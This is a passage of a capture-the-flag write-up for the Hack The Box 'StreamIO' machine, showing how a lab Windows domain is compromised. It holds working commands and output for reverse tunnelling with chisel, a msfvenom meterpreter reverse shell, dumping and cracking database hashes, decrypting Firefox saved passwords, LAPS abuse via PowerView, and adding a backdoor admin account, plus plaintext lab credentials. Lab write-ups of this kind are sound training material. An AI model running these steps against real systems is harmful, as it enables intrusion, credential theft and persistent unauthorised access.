d-----        2/22/2022   3:19 AM                js                                                                    
-a----         6/3/2022   1:51 AM           2401 index.php                                                             
-a----         6/3/2022   1:53 AM           3055 master.php                                                            
-a----        2/23/2022   2:16 AM            878 movie_inc.php                                                         
-a----        2/23/2022   2:16 AM            936 staff_inc.php                                                         
-a----        2/23/2022   2:16 AM            879 user_inc.php  
```


# Prilige escalation to nikk37

Let me use bloodhound before everything else. 

I uploaded SharpHound with curl and execute it:


```bash
C:\inetpub\streamio.htb\admin>curl http://10.10.14.8:8081/SharpHound.exe -o SharpHound.exe    
curl http://10.10.14.8:8081/SharpHound.exe -o SharpHound.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  885k  100  885k    0     0   548k      0  0:00:01  0:00:01 --:--:--  548k

C:\inetpub\streamio.htb\admin>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\inetpub\streamio.htb\admin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A381-2B63

 Directory of C:\inetpub\streamio.htb\admin

09/12/2022  04:08 PM    <DIR>          .
09/12/2022  04:08 PM    <DIR>          ..
02/22/2022  03:49 AM    <DIR>          css
02/22/2022  03:49 AM    <DIR>          fonts
02/22/2022  03:49 AM    <DIR>          images
06/03/2022  01:51 AM             2,401 index.php
02/22/2022  04:19 AM    <DIR>          js
06/03/2022  01:53 AM             3,055 master.php
02/23/2022  03:16 AM               878 movie_inc.php
09/12/2022  04:08 PM           906,752 SharpHound.exe
02/23/2022  03:16 AM               936 staff_inc.php
02/23/2022  03:16 AM               879 user_inc.php
09/12/2022  03:42 PM         1,964,032 winPEASx64.exe
               7 File(s)      2,878,933 bytes
               6 Dir(s)   7,156,715,520 bytes free

C:\inetpub\streamio.htb\admin>SharpHound.exe
SharpHound.exe
2022-09-12T16:09:02.1408479-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-12T16:09:02.1564500-07:00|INFORMATION|Initializing SharpHound at 4:09 PM on 9/12/2022
2022-09-12T16:09:02.3126927-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-12T16:09:02.4845686-07:00|INFORMATION|Beginning LDAP search for streamIO.htb
2022-09-12T16:09:02.5314943-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-09-12T16:09:02.5314943-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-09-12T16:09:32.6897120-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2022-09-12T16:09:48.2155592-07:00|INFORMATION|Consumers finished, closing output channel
2022-09-12T16:09:48.2468117-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-09-12T16:09:48.6062227-07:00|INFORMATION|Status: 97 objects finished (+97 2.108696)/s -- Using 40 MB RAM
2022-09-12T16:09:48.6062227-07:00|INFORMATION|Enumeration finished in 00:00:46.1228053
2022-09-12T16:09:48.7311860-07:00|INFORMATION|SharpHound Enumeration Completed at 4:09 PM on 9/12/2022! Happy Graphing!

C:\inetpub\streamio.htb\admin>dir
```

I downloaded it from the web. Other players can't guess it and I had to use the lazest method to download the zip to my machine. 

## Analysing Bloodhound

![](@attachment/Clipboard_2022-09-13-10-58-24.png)


We see that NIKK37 can PS remote to DC: 

![](@attachment/Clipboard_2022-09-13-11-08-52.png)

let's target this user. I noticed that the user nikk37 is not part of the database we dumped before. Also, you can notice port mssql is open: 

![](@attachment/Clipboard_2022-09-12-16-37-08.png)


with winpease

![](@attachment/Clipboard_2022-09-12-16-50-44.png)

I browsed the dirs for a while before I did that. You never know what you can find. However I thought about mssql because we still have creds of the `db_admin`. 

Let's connect to mssql by performing port forwarding using chisel: 

On my machine: 

```bash
─$ chisel server -p 9000 --reverse
2022/09/13 12:01:16 server: Reverse tunnelling enabled
2022/09/13 12:01:16 server: Fingerprint 1tgcIT9rqoReBFG6Fjv9Nc11+sQKfa3qAQu3jeD2OtE=
2022/09/13 12:01:16 server: Listening on http://0.0.0.0:9000
2022/09/13 12:02:04 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/09/13 12:02:04 server: session#1: tun: proxy#R:1433=>1433: Listening
2022/09/13 12:09:44 server: session#2: Client version (1.7.7) differs from server version (0.0.0-src)
2022/09/13 12:09:44 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

On target machine: 

```bash
PS C:\inetpub\streamio.htb\admin> cmd /c chisel.exe client 10.10.14.96:9000 R:1433:127.0.0.1:1433
cmd /c chisel.exe client 10.10.14.96:9000 R:1433:127.0.0.1:1433
2022/09/13 12:02:37 client: Connecting to ws://10.10.14.96:9000
2022/09/13 12:02:38 client: Connected (Latency 129.8713ms)
```

Let's connect to mssqlclient using the previously obtained creds. 


```bash
└─$ sqsh -S 127.0.0.1:1433 -U db_admin -P B1@hx31234567890
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 

```

Tried to use xp_cmdshell to get command execution just for fun: 

```bash
1> xp_cmdshell 'whoami'
2> go
Msg 15281, Level 16, State 1
Server 'DC', Procedure 'xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system
administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Nope, I don't have permission: X)

```bash
1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
2> reconfigure
3> go
Msg 15123, Level 16, State 1
Server 'DC', Procedure 'SP_CONFIGURE', Line 62
The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
(return status = 1)
Msg 5812, Level 14, State 1
Server 'DC', Line 2
You do not have permission to run the RECONFIGURE statement.
1> 

```

However, let's look for databeses and dump them. We are looking for nikk37. I remember  streamio_backup. I took the name from the SQL injection we exploited before using sqlmap.

I got the syntax from: https://stackoverflow.com/questions/811616/whats-the-equivalent-of-show-tables-in-sqsh

```bash
1> select table_name from streamio_backup.information_schema.tables;
2> go

        table_name                                                                                                                                                                           
                                                                                                                                                                                             
                                                                                                                                              

        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------

        movies                                                                                                                                                                               
                                                                                                                                                                                             
                                                                                                                                              

        users                                                                                                                                                                                
                                                                                                                                                                                             
                                                                                                                                              

(2 rows affected)

```
Let's investiagte the users table.

```bash

1> select * from users
2> go
 id         
        username                                                                                                                                                                             
                   
        password                                                                                                                                                                             
                   
 -----------
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------
           1
        nikk37                                                                                                                                                                               
                   
        389d14cb8e4e9b94b137deb1caf0612a                                                                                                                                                     
                   
           2
        yoshihide                                                                                                                                                                            
                   
        b779ba15cedfd22a023c4d8bcf5f2332                                                                                                                                                     
                   
           3
        James                                                                                                                                                                                
                   
        c660060492d9edcaa8332d89c99c9239                                                                                                                                                     
                   
           4
        Theodore                                                                                                                                                                             
                   
        925e5408ecb67aea449373d668b7359e                                                                                                                                                     
                   
           5
        Samantha                                                                                                                                                                             
                   
        083ffae904143c4796e464dac33c1f7d                                                                                                                                                     
                   
           6
        Lauren                                                                                                                                                                               
                   
        08344b85b329d7efd611b7a7743e8a09                                                                                                                                                     
                   
           7
        William                                                                                                                                                                              
                   
        d62be0dc82071bccc1322d64ec5b6c51                                                                                                                                                     
                   
           8
        Sabrina                                                                                                                                                                              
                   
        f87d3c0d6c8fd686aacc6627f1f493a5                                                                                                                                                     
                   

(8 rows affected)
1> 

```

We got nikk37's hash. Let's crack it. 

![](@attachment/Clipboard_2022-09-13-13-26-37.png)

Found password: `get_dem_girls2@yahoo.com`

let's connect using evilwinrm. 

```bash
evil-winrm -i 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nikk37\Documents> ls
*Evil-WinRM* PS C:\Users\nikk37\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\nikk37\Desktop> ls


    Directory: C:\Users\nikk37\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/13/2022   4:13 AM             34 user.txt


*Evil-WinRM* PS C:\Users\nikk37\Desktop> cat user.txt
b0ba5**********************6ca
*Evil-WinRM* PS C:\Users\nikk37\Desktop> 

```
## Going for the root.

After running WinPease and carefully anaylsing the output for a while, I found that firefox has some creds: 

```bash
ÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

```

Found this [article](https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/) that explains how to exploit firefox passwords. The tool SharpWeb didn't work for me.

However the creds are stored are login.json but they are 3DES CBC mode Encrypted. I downloaded the login.json

I switeched from evil-winrm to meterpreter to download the files because evil-winrm seemed to fail to download them. 

No AV is enabled on target machine so this not going to be an issue. 

```bash
─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.14.108" LPORT=4242 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

MSFCONSOLE

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.108
LHOST => 10.10.14.108
msf6 exploit(multi/handler) > set LPORT 4242
LPORT => 4242
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.108:4242 
[*] Sending stage (175174 bytes) to 10.10.11.158
[*] Meterpreter session 1 opened (10.10.14.108:4242 -> 10.10.11.158:61762) at 2022-09-14 12:35:55 +0100

meterpreter > ls

...
```
## Decrypting Firefox passwords

After downloading the two files, I used this tool [firepwd](https://github.com/lclevy/firepwd) to decrypt the passwords and usernames. We only need the key4.db and logins.json so we specify the directory where the two files are and that's it. 

```bash
└─$ .env/local/bin/python3 firepwd.py -d ~/hackthebox/streamio/
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'

```

JDGODD user has `writeowner` on `core staff` whom has LAPS permission: 

![](@attachment/Clipboard_2022-09-13-17-21-53.png)

First, let's upload powerview:

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> upload ~/tools/ad_tools/PowerTools/PowerView/powerview.ps1
Info: Uploading ~/tools/ad_tools/PowerTools/PowerView/powerview.ps1 to C:\Users\nikk37\Documents\powerview.ps1

                                                             
Data: 484392 bytes of 484392 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\powerview.ps1

```

We have user, JDGOdd, we added him to CORE STAFF because we have the 'WriteOwner'.

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Password = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('StreamIO\JDGodd', $Password)
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity "StreamIO\JDGodd"
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity "Core Staff" -Members "StreamIO\JDGodd" -Credential $Cred
```

Now Just like in Timelapse machine we exploit LAPS by dumping a temporary password for the administrator.  

```bash
└─$ python3 laps.py -u JDGodd -p JDg0dd1s@d0p3cr3@t0r -d streamio.htb 
LAPS Dumper - Running at 09-14-2022 13:38:34
DC NE7/,;D8%1{$xZ
                                                                                                                                                                                             
┌──(user㉿marco)-[~/tools/ad_tools/LAPSDumper]
└─$ evil-winrm -i 10.10.11.158 -u Administrator -p 'NE7/,;D8%1{$xZ'          

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

What is LAPS? 

from Microsof: 

```
The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.
```
## Beyond root

Stuff I like to do on Active Directory boxes: Adding my own user. 

You have to adopt the PWN --> Pivot --> Escalate

Add a user to the local admin groups: 


```bash
*Evil-WinRM* PS C:\Users\Martin\Desktop> cmd /c net user TheRedTea ushallnotpass /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\Martin\Desktop> cmd /c  net localgroup administrators TheRedTea /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\Martin\Desktop> net localgroup "Remote Desktop Users" "TheRedTea" /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\Martin\Desktop> cmd /c net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd
krbtgt                   Martin                   nikk37
TheRedTea                yoshihide
The command completed with one or more errors.
```
See you in the next writeup. 

